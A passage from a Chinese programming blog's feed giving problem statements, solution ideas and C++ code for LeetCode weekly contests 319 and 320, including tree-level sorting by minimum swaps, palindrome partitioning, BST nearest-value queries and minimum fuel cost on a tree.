<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     TreeNode *right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">getMinSwaps</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;nums)</span></span>&#123;</span><br><span class="line">        <span class="comment">//排序</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">nums1</span><span class="params">(nums)</span></span>;</span><br><span class="line">        <span class="built_in">sort</span>(nums1.<span class="built_in">begin</span>(),nums1.<span class="built_in">end</span>());</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; m;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">            m[nums1[i]] = i;<span class="comment">//建立每个元素与其应放位置的映射关系</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> loops = <span class="number">0</span>;<span class="comment">//循环节个数</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">flag</span><span class="params">(len,<span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="comment">//找出循环节的个数</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (!flag[i])&#123;<span class="comment">//已经访问过的位置不再访问</span></span><br><span class="line">                <span class="type">int</span> j = i;</span><br><span class="line">                <span class="keyword">while</span> (!flag[j])&#123;</span><br><span class="line">                    flag[j] = <span class="literal">true</span>;</span><br><span class="line">                    j = m[nums[j]];<span class="comment">//原序列中j位置的元素在有序序列中的位置</span></span><br><span class="line">                &#125;</span><br><span class="line">                loops++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> len - loops;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumOperations</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        queue&lt;TreeNode *&gt; qu;</span><br><span class="line">        qu.<span class="built_in">emplace</span>(root);</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> sz = qu.<span class="built_in">size</span>();</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; arr;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; sz; i++) &#123;</span><br><span class="line">                TreeNode *node = qu.<span class="built_in">front</span>();</span><br><span class="line">                qu.<span class="built_in">pop</span>();</span><br><span class="line">                arr.<span class="built_in">emplace_back</span>(node-&gt;val);</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;left) &#123;</span><br><span class="line">                    qu.<span class="built_in">emplace</span>(node-&gt;left);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (node-&gt;right) &#123;</span><br><span class="line">                    qu.<span class="built_in">emplace</span>(node-&gt;right);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res += <span class="built_in">getMinSwaps</span>(arr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6236-不重叠回文子字符串的最大数目"><a href="#6236-不重叠回文子字符串的最大数目" class="headerlink" title="6236. 不重叠回文子字符串的最大数目"></a>6236. 不重叠回文子字符串的最大数目</h3><p>给你一个字符串 <code>s</code> 和一个 <strong>正</strong> 整数 <code>k</code> 。</p>
<p>从字符串 <code>s</code> 中选出一组满足下述条件且 <strong>不重叠</strong> 的子字符串：</p>
<ul>
<li>每个子字符串的长度 <strong>至少</strong> 为 <code>k</code> 。</li>
<li>每个子字符串是一个 <strong>回文串</strong> 。</li>
</ul>
<p>返回最优方案中能选择的子字符串的 <strong>最大</strong> 数目。</p>
<p><strong>子字符串</strong> 是字符串中一个连续的字符序列。</p>
<p><strong>示例 1 ：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;abaccdbbd&quot;, k = 3</span><br><span class="line">输出：2</span><br><span class="line">解释：可以选择 s = &quot;abaccdbbd&quot; 中斜体加粗的子字符串。&quot;aba&quot; 和 &quot;dbbd&quot; 都是回文，且长度至少为 k = 3 。</span><br><span class="line">可以证明，无法选出两个以上的有效子字符串。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2 ：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;adbcda&quot;, k = 2</span><br><span class="line">输出：0</span><br><span class="line">解释：字符串中不存在长度至少为 2 的回文子字符串。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= k &lt;= s.length &lt;= 2000</code></li>
<li><code>s</code> 仅由小写英文字母组成</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-319/problems/maximum-number-of-non-overlapping-palindrome-substrings/">https://leetcode.cn/contest/weekly-contest-319/problems/maximum-number-of-non-overlapping-palindrome-substrings/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 动态规划</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>第四题为简单的动态规划题目了，太常见的题目了，设 $dp[i]$ 表示前 $i$ 个字符构成的回文串的最大数目，$valid[i][j]$ 表示字符串从  $i$ 到 $j$ 是否为回文字符串，则可以知道递推关系如下:<br>$$<br>dp[i] &#x3D; \max(dp[i], dp[i-j] + valid[i-j+1][i]) \quad j \ge k<br>$$</li>
<li>首先我们求出 $s[i,\cdots,j]$ 是否为回文字符串，我们每次以 $i$ 为中心向左右扩展即可。然后利用上述的递推关系求出即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n^2)$，其中 $n$ 表示给定的字符串的长度。</li>
<li>空间复杂度：$O(n^2)$，其中 $n$ 表示给定的字符串的长度。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxPalindromes</span><span class="params">(string s, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">valid</span>(n, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            valid[i][i] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> l = i, r = i; l &gt;= <span class="number">0</span> &amp;&amp; r &lt; n &amp;&amp; s[l] == s[r]; l--, r++) &#123;</span><br><span class="line">                valid[l][r] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> l = i, r = i + <span class="number">1</span>; l &gt;= <span class="number">0</span> &amp;&amp; r &lt; n &amp;&amp; s[l] == s[r]; l--, r++) &#123;</span><br><span class="line">                valid[l][r] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[i] = dp[i - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i - k; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (valid[j][i - <span class="number">1</span>]) &#123;</span><br><span class="line">                    dp[i] = <span class="built_in">max</span>(dp[i], dp[j] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  contest 320</title>
    <url>/2022/11/25/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/82/</url>
    <content><![CDATA[<h2 id="leetcode-contest-320"><a href="#leetcode-contest-320" class="headerlink" title="leetcode  contest 320"></a>leetcode  contest 320</h2><p>题目质量确实很不错，适合用来作为面试题目。</p>
<h3 id="2475-数组中不等三元组的数目"><a href="#2475-数组中不等三元组的数目" class="headerlink" title="2475. 数组中不等三元组的数目"></a>2475. 数组中不等三元组的数目</h3><p>给你一个下标从 <code>0</code> 开始的正整数数组 <code>nums</code> 。请你找出并统计满足下述条件的三元组 <code>(i, j, k) </code>的数目：</p>
<ul>
<li><code>0 &lt;= i &lt; j &lt; k &lt; nums.length</code></li>
<li><code>nums[i]、nums[j]</code> 和 <code>nums[k]</code> 两两不同 。</li>
<li>换句话说：<code>nums[i] != nums[j]、nums[i] != nums[k] 且 nums[j] != nums[k]</code> 。<br>返回满足上述条件三元组的数目。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4,4,2,4,3]</span><br><span class="line">输出：3</span><br><span class="line">解释：下面列出的三元组均满足题目条件：</span><br><span class="line">- (0, 2, 4) 因为 4 != 2 != 3</span><br><span class="line">- (1, 2, 4) 因为 4 != 2 != 3</span><br><span class="line">- (2, 3, 4) 因为 2 != 4 != 3</span><br><span class="line">共计 3 个三元组，返回 3 。</span><br><span class="line">注意 (2, 0, 4) 不是有效的三元组，因为 2 &gt; 0 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,1,1,1,1]</span><br><span class="line">输出：0</span><br><span class="line">解释：不存在满足条件的三元组，所以返回 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>3 &lt;= nums.length &lt;= 100</code></li>
<li><code>1 &lt;= nums[i] &lt;= 1000</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/number-of-unequal-triplets-in-array/">https://leetcode.cn/problems/number-of-unequal-triplets-in-array/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接遍历即可
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接遍历数组中所有元素即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">unequalTriplets</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = i + <span class="number">1</span>; j &lt; n; j++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = j + <span class="number">1</span>; k &lt; n; k++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nums[i] != nums[j] &amp;&amp; nums[i] != nums[k] &amp;&amp; nums[j] != nums[k]) &#123;</span><br><span class="line">                        ans++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2476-二叉搜索树最近节点查询"><a href="#2476-二叉搜索树最近节点查询" class="headerlink" title="2476. 二叉搜索树最近节点查询"></a>2476. 二叉搜索树最近节点查询</h3><p>你一个 二叉搜索树 的根节点 <code>root</code> ，和一个由正整数组成、长度为 <code>n</code> 的数组 <code>queries</code> 。</p>
<p>请你找出一个长度为 <code>n</code> 的 二维 答案数组 <code>answer</code> ，其中 <code>answer[i] = [mini, maxi]</code> ：</p>
<ul>
<li><code>mini</code> 是树中小于等于 <code>queries[i]</code> 的 最大值 。如果不存在这样的值，则使用 <code>-1</code> 代替。</li>
<li><code>maxi</code> 是树中大于等于 <code>queries[i]</code> 的 最小值 。如果不存在这样的值，则使用 <code>-1</code> 代替。<br>返回数组 <code>answer</code> 。</li>
</ul>
<p>示例 1 ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [6,2,13,1,4,9,15,null,null,null,null,null,null,14], queries = [2,5,16]</span><br><span class="line">输出：[[2,2],[4,6],[15,-1]]</span><br><span class="line">解释：按下面的描述找出并返回查询的答案：</span><br><span class="line">- 树中小于等于 2 的最大值是 2 ，且大于等于 2 的最小值也是 2 。所以第一个查询的答案是 [2,2] 。</span><br><span class="line">- 树中小于等于 5 的最大值是 4 ，且大于等于 5 的最小值是 6 。所以第二个查询的答案是 [4,6] 。</span><br><span class="line">- 树中小于等于 16 的最大值是 15 ，且大于等于 16 的最小值不存在。所以第三个查询的答案是 [15,-1] 。</span><br></pre></td></tr></table></figure>
<p>示例 2 ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root = [4,null,9], queries = [3]</span><br><span class="line">输出：[[-1,4]]</span><br><span class="line">解释：树中不存在小于等于 3 的最大值，且大于等于 3 的最小值是 4 。所以查询的答案是 [-1,4] 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li>树中节点的数目在范围 <code>[2, 105]</code> 内</li>
<li><code>1 &lt;= Node.val &lt;= 106</code></li>
<li><code>n == queries.length</code></li>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>1 &lt;= queries[i] &lt;= 106</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-320/problems/closest-nodes-queries-in-a-binary-search-tree/">https://leetcode.cn/contest/weekly-contest-320/problems/closest-nodes-queries-in-a-binary-search-tree/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>二分查找
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单题目，直接利用二分查找即可非常简单的题目。中序遍历二叉查找树即可使得数组遍历结果有序。</li>
<li>利用二分查找给定的元素大于等于该元素的最小值即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n + m \log n)$，其中 $n$ 为节点的数目，$m$ 表示查询的次数。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，其中 $n$ 为节点的数目。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(TreeNode *root, vector&lt;<span class="type">int</span>&gt; &amp;res)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!root) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="built_in">dfs</span>(root-&gt;left, res);</span><br><span class="line">        res.<span class="built_in">emplace_back</span>(root-&gt;val);</span><br><span class="line">        <span class="built_in">dfs</span>(root-&gt;right, res);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">closestNodes</span>(TreeNode* root, vector&lt;<span class="type">int</span>&gt;&amp; queries) &#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; arr;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">dfs</span>(root, arr);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : queries) &#123;</span><br><span class="line">            vector&lt;<span class="type">int</span>&gt; curr = &#123;<span class="number">-1</span>, <span class="number">-1</span>&#125;;</span><br><span class="line">            <span class="keyword">auto</span> it = <span class="built_in">lower_bound</span>(arr.<span class="built_in">begin</span>(), arr.<span class="built_in">end</span>(), v);</span><br><span class="line">            <span class="keyword">if</span> (it != arr.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                curr[<span class="number">1</span>] = *it;</span><br><span class="line">                <span class="keyword">if</span> (*it == v) &#123;</span><br><span class="line">                    curr[<span class="number">0</span>] = *it;</span><br><span class="line">                    res.<span class="built_in">emplace_back</span>(curr);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (it != arr.<span class="built_in">begin</span>()) &#123;</span><br><span class="line">                curr[<span class="number">0</span>] = *(--it);</span><br><span class="line">            &#125;</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(curr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2477-到达首都的最少油耗"><a href="#2477-到达首都的最少油耗" class="headerlink" title="2477. 到达首都的最少油耗"></a>2477. 到达首都的最少油耗</h3><p>给你一棵 <code>n</code> 个节点的树（一个无向、连通、无环图），每个节点表示一个城市，编号从 <code>0</code> 到 <code>n - 1</code> ，且恰好有 <code>n - 1</code> 条路。<code>0</code> 是首都。给你一个二维整数数组 <code>roads</code> ，其中 <code>roads[i] = [ai, bi]</code> ，表示城市 <code>ai</code> 和 <code>bi</code> 之间有一条 双向路 。</p>
<p>每个城市里有一个代表，他们都要去首都参加一个会议。</p>
<p>每座城市里有一辆车。给你一个整数 <code>seats</code> 表示每辆车里面座位的数目。</p>
<p>城市里的代表可以选择乘坐所在城市的车，或者乘坐其他城市的车。相邻城市之间一辆车的油耗是一升汽油。</p>
<p>请你返回到达首都最少需要多少升汽油。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：roads = [[0,1],[0,2],[0,3]], seats = 5</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">- 代表 1 直接到达首都，消耗 1 升汽油。</span><br><span class="line">- 代表 2 直接到达首都，消耗 1 升汽油。</span><br><span class="line">- 代表 3 直接到达首都，消耗 1 升汽油。</span><br><span class="line">最少消耗 3 升汽油。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：roads = [[3,1],[3,2],[1,0],[0,4],[0,5],[4,6]], seats = 2</span><br><span class="line">输出：7</span><br><span class="line">解释：</span><br><span class="line">- 代表 2 到达城市 3 ，消耗 1 升汽油。</span><br><span class="line">- 代表 2 和代表 3 一起到达城市 1 ，消耗 1 升汽油。</span><br><span class="line">- 代表 2 和代表 3 一起到达首都，消耗 1 升汽油。</span><br><span class="line">- 代表 1 直接到达首都，消耗 1 升汽油。</span><br><span class="line">- 代表 5 直接到达首都，消耗 1 升汽油。</span><br><span class="line">- 代表 6 到达城市 4 ，消耗 1 升汽油。</span><br><span class="line">- 代表 4 和代表 6 一起到达首都，消耗 1 升汽油。</span><br><span class="line">最少消耗 7 升汽油。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：roads = [], seats = 1</span><br><span class="line">输出：0</span><br><span class="line">解释：没有代表需要从别的城市到达首都。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= n &lt;= 105</code></li>
<li><code>roads.length == n - 1</code></li>
<li><code>roads[i].length == 2</code></li>
<li><code>0 &lt;= ai, bi &lt; n</code></li>
<li><code>ai != bi</code></li>
<li><code>roads</code> 表示一棵合法的树。</li>
<li><code>1 &lt;= seats &lt;= 105</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/minimum-fuel-cost-to-report-to-the-capital/description/">https://leetcode.cn/problems/minimum-fuel-cost-to-report-to-the-capital/description/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心算法
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>涉及到一个比较有意思的贪心算法，题目中有几个重要的前提如下:</li>
</ol>
<ul>
<li>每个代表走不会走回头路，即每个代表只会从 $a\rightarrow b$，路劲不会是 $a \rightarrow c \rightarrow d \rightarrow c \rightarrow b$；</li>
<li>对于每个代表的行程可以不是连续的，比如代表 $1$ 可以先到达 $a$，等待空闲车辆到达，然后共享车辆一起到达 $c$。</li>
</ul>
<ol start="2">
<li>我们设 $tot(x)$ 表示到达节点 $x$ 的人数之和，则所有人到达节点 $x$ 后，总共需要的车辆数目最少为 $\lceil \dfrac{tot[x]}{seats}\rceil$，则此时这些车辆移动一步需要的油耗最少为 $\lceil \dfrac{tot[ch(x)]}{seats}\rceil$，我们依次求出即可，此时从节点 $x$ 出发的车辆总数为 $\lceil \dfrac{tot[x]}{seats}\rceil + 1$。 </li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 为给定的节点的数目。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，$n$ 为给定的节点的数目。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">minimumFuelCost</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; roads, <span class="type">int</span> seats)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = roads.<span class="built_in">size</span>() + <span class="number">1</span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">graph</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> v : roads) &#123;</span><br><span class="line">            graph[v[<span class="number">0</span>]].<span class="built_in">emplace_back</span>(v[<span class="number">1</span>]);</span><br><span class="line">            graph[v[<span class="number">1</span>]].<span class="built_in">emplace_back</span>(v[<span class="number">0</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visit</span><span class="params">(n, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        function&lt;<span class="type">int</span>(<span class="type">int</span>)&gt; dfs = [&amp;](<span class="type">int</span> curr)-&gt;<span class="type">int</span> &#123;</span><br><span class="line">            visit[curr] = <span class="literal">true</span>;</span><br><span class="line">            <span class="type">int</span> totSum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> next : graph[curr]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (visit[next]) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="type">int</span> tot = <span class="built_in">dfs</span>(next);</span><br><span class="line">                res += <span class="built_in">ceil</span>((<span class="type">double</span>)tot / seats);</span><br><span class="line">                totSum += tot;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> totSum + <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="built_in">dfs</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2478-完美分割的方案数"><a href="#2478-完美分割的方案数" class="headerlink" title="2478. 完美分割的方案数"></a>2478. 完美分割的方案数</h3><p>给你一个字符串 <code>s</code> ，每个字符是数字 <code>&#39;1&#39;</code> 到 <code>&#39;9&#39;</code> ，再给你两个整数 <code>k</code> 和 <code>minLength</code> 。</p>
<p>如果对 <code>s</code> 的分割满足以下条件，那么我们认为它是一个 完美 分割：</p>
<ul>
<li><code>s</code> 被分成 <code>k</code> 段互不相交的子字符串。</li>
<li>每个子字符串长度都 至少 为 <code>minLength</code> 。<br>每个子字符串的第一个字符都是一个 质数 数字，最后一个字符都是一个 非质数 数字。质数数字为 <code>&#39;2&#39;</code> ，<code>&#39;3&#39;</code> ，<code>&#39;5&#39;</code> 和 <code>&#39;7&#39;</code> ，剩下的都是非质数数字。<br>请你返回 <code>s</code> 的 完美 分割数目。由于答案可能很大，请返回答案对 <code>109 + 7</code> 取余 后的结果。</li>
</ul>
<p>一个 子字符串 是字符串中一段连续字符串序列。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;23542185131&quot;, k = 3, minLength = 2</span><br><span class="line">输出：3</span><br><span class="line">解释：存在 3 种完美分割方案：</span><br><span class="line">&quot;2354 | 218 | 5131&quot;</span><br><span class="line">&quot;2354 | 21851 | 31&quot;</span><br><span class="line">&quot;2354218 | 51 | 31&quot;</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;23542185131&quot;, k = 3, minLength = 3</span><br><span class="line">输出：1</span><br><span class="line">解释：存在一种完美分割方案：&quot;2354 | 218 | 5131&quot; 。</span><br></pre></td></tr></table></figure>
<p>示例 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;3312958&quot;, k = 3, minLength = 1</span><br><span class="line">输出：1</span><br><span class="line">解释：存在一种完美分割方案：&quot;331 | 29 | 58&quot; 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= k, minLength &lt;= s.length &lt;= 1000</code></li>
<li><code>s</code> 每个字符都为数字 <code>&#39;1&#39;</code> 到 <code>&#39;9&#39;</code> 之一。</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/number-of-beautiful-partitions/description/">https://leetcode.cn/problems/number-of-beautiful-partitions/description/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 动态规划</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>设 $dp[i][j]$ 表示前 $j$ 个字母存在长度为 $i$ 的完美分割的方案数，如果我们按照常规的动态规划可以知道，一定需要满足如下才可以完成分割:</li>
</ol>
<ul>
